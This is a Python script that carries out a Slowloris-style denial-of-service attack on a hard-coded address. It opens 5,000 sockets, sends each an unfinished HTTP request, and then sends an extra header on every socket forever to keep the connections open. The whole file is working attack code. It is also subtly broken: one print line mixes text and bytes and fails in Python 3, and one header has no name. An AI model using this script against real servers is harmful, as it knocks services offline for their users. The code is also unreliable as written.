import socket, random

ip = "172.21.210.74"
port = 2000
request_count = 5000

sockets = []

def exec(ip, port):
    request_headers = [
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.43",
      "Accept-language: en-US,en"
    ]
    request_http_text = "GET /?{} HTTP/1.1\r\n"

    http_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    http_socket.connect((ip, port))
    http_socket.send(request_http_text.format(random.randint(0, 1000)).encode("utf-8"))

    for current_header in request_headers:
        message = "{}\r\n".format(current_header).encode("utf-8")
        http_socket.send(message)
        print("MESSAGE:" + message)

    return http_socket

def run():
  for x in range(request_count):
    http_socket = exec(ip, port)
    sockets.append(http_socket)

  while True:
      for http_socket in sockets:
          http_socket.send("X-a: {}\r\n".format(random.randint(1, 1000)).encode("utf-8"))

run()
